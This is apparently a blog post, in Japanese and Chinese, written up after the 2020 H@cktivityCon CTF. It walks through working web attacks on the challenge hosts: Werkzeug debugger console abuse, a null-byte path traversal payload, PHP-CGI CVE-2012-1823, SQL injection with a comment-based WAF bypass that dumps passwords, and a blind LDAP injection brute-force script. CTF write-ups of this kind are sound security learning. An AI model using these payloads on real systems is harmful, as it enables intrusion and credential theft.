---
layout: post
title:  H@cktivityCon CTF Writeup
date:   2020-08-01 10:11:34 +0800
categories: CTF
---

このCTFはhackeroneさんが開催したのCTFですね。今回は見学のようにチームBlack Bauhiniaのみなさんと一緒に遊びましたが、ほとんどチームのみなさんがわたしより早く問題解いたので。二つのフラグしか入れた。

昔からhackeroneでBug Bountyを始めると思ってますがmethodologyがわからないから全然やったことありません。

***

## [Web] Ladybug

打開了題目給的link，用wappalyzer看到是用Flask

試了在/film後面亂打東西，就出了AssertionError出來。查了一下是Werkzeug的debugger
之後去/console就能拿到個在行python的console，在裡面跑os的command把flag找出來就行了
```python
>>>import os
>>>os.listdir()
>>>a=open('flag.txt','r')
>>>a.read()
```
![Ladybug](/images/Hacktivitycon-CTF/flag.PNG)

## [Web] Bite

很令人懷念的null byte attack

如果在page打xxx上去，他會說沒有xxx.php，所以加```%00```在後面把.php去掉就行了
之後就用運把flag.txt找出來:P

```jh2i.com:50010/?page=../../../../../flag.txt%00```

![bite](/images/Hacktivitycon-CTF/bite.PNG)

## [Web] GI Joe

這個聽說也是很舊的東西，CVE也好像是2012年的東西

在URL後面加```?-s```的話，就能看到那個page的source code

參考著徳丸さん的記事 https://blog.tokumaru.org/2012/05/php-cgi-remote-scripting-cve-2012-1823.html

在Burp suite request payload過去(下圖)，flag就出來了

![GIJoe](/images/Hacktivitycon-CTF/GIJoe.PNG)

## [Web] Waffle Land

在search那邊打`'`會發現到有SQL injection，先用`' order by 5 -- #'`找到有多少field。之後就是用union select把想要的東西(username/password)拿出來。

可是打`union select`的話，就會被503，有WAF在前面阻住不給打`union select`

把`union select`換成`union/**/select`就能bypass WAF

```SQL
' and 0 union/**/select 1,GROUP_CONCAT(username),GROUP_CONCAT(password),4,5 FROM user -- #
```

然後就能拿到admin的password```admin:NT7b#ed4$J?eZ#m_```，再去Login就有flag了

## [Web] Lightweight Contact Book

LDAP Injection對我來說是初見的說，這個做起來有種blind injection的感覺

Webpage只有Display name跟email，先要把隱藏的field撞出來，再每一個字去試admin的那個field的內容是什麼。 寫了個script讓他去撞

```python
import requests
#attlist = ['First Name','Initials','description','office']
string = ''
end = False

while(end == False):
	for i in range(95, 127):
		r = requests.get('http://jh2i.com:50019/?search=*)(description=' + string + chr(i) + '*')
		if 'administrator@hacktivitycon.local' in r.text:
			string += chr(i)
			print(string)
			end = False
			break
		end = True
```

password是`very_secure_hacktivity_pass`寫了在description裡 登入之後就會給flag

![light](/images/Hacktivitycon-CTF/Light.PNG)

## [pwn]Pancakes

![pancakes](/images/Hacktivitycon-CTF/pancakes.png)

## [Scripting]Misdirection

按下get flag之後就會狂redirect，而redirect裡有拆開了的flag，把字拾起來再連在一起就行了

```python
import requests

headers = {
    'Accept-Encoding': 'gzip, deflate, sdch',
    'Accept-Language': 'en-US,en;q=0.8',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Cache-Control': 'max-age=0',
    'Connection': 'keep-alive',
}
flag = ''
r = requests.get('http://jh2i.com:50011/site/flag.php', headers=headers, allow_redirects=False)
while(r.headers['Location'] != None):
	link = r.headers['Location'] 
	r = requests.get('http://jh2i.com:50011'+ link, headers=headers, allow_redirects=False)
	# print(r.text)
	if 'flag' in r.text:
		s = r.text
		s = s.split(' ')
		s = s[6].split('\n')
		flag += s[0]
		print(flag)

```

## [Warmup] InternetCattos

在terminal行TCPdump，再在另一個terminal nc去題目給的資訊
```bash
$ sudo tcpdump -annXX host 104.197.242.66
```

![internetcattos](/images/Hacktivitycon-CTF/InternetCattos.PNG)